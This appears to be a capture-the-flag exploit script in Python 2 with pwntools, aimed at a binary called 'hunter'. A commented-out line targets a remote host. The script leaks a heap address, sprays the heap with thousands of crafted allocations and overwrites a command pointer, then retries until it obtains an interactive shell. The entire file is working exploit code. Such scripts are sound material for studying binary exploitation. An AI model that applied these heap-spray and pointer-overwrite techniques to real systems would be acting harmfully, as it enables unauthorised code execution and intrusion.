#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
#context.log_level = "debug"

def initer(name):

    p.recvuntil("?:")
    p.sendline("name")
    p.recvuntil("item\n")

def spawn(expr, color, name):

    payload = " " * 15 + "1"
    payload += " " * 15 + "1"
    payload += str(color).rjust(0x10," ")
    payload += "a" * 8
    p.send(payload)
    p.recv()

def hunt():

    p.sendline("2")
    time.sleep(0.2)
    return p.recvuntil("item\n")

def change(name):

    p.sendline("3")
    p.recvuntil("name?:")
    p.send(name)
    time.sleep(0.2)
    p.recvuntil("item\n")

def buy(item):

    p.sendline("4")
    p.recvuntil("sphere (300 zeny)\n")
    p.sendline(str(item))
    time.sleep(0.2)
    return p.recvuntil("item\n")

def leet(command, shell=0):

    p.sendline("1337")
    p.recvuntil("mand? :")
    p.send(command)
    if shell == 1:
        p.interactive()
    return p.recvuntil("item\n")

command = 0x804b06c
money_size = 0x804b078
r = 0

X = 1
spray = []
start = "0a"
for i in range(10):
    temp = int(start,16) + i
    go = hex(temp).split("0x")[1].rjust(2,"0")
    item = go * 4
    spray.append(item)

while r < 1: #to make two circum meet.
    #p = remote("124.16.75.161", 40006)
    p = process("./hunter")
    count = 0
    initer("afang")
    for i in range(11):
        buy(0)
    change("a"*8)
    #leak that.
    dust = u32(leet("black sheep wall").split("a"*8,1)[1].split("!!")[0])
    target1 = dust & 0xfffffffc
    print hex(target1)
    k = 1
    for i in spray:
        print "[*]Sending Stager " + str(k)
        k += 1
        if i == "0a0a0a0a":
            amount = (int(i,16) - target1)/16400 - 200
            for d in range(amount):
                spawn(123,int(i,16), "afang")
                print d
            time.sleep(1)
        else:
            for j in range(1000):
                spawn(123, int(i,16),"afang")
                print j
            time.sleep(1)
    for i in range(1052):
        spawn(123, int(command - 8), "afang")
    time.sleep(5)
    leet("game over man")
    leet("a" * 8 + p32(target1 + 0x2000))
    try:
        print "[*]Trying number " + str(X)
        buy(26739)
        wait("me")
        leet("power overwhelming", shell=1)
    except:
        p.close()
        X += 1
        continue

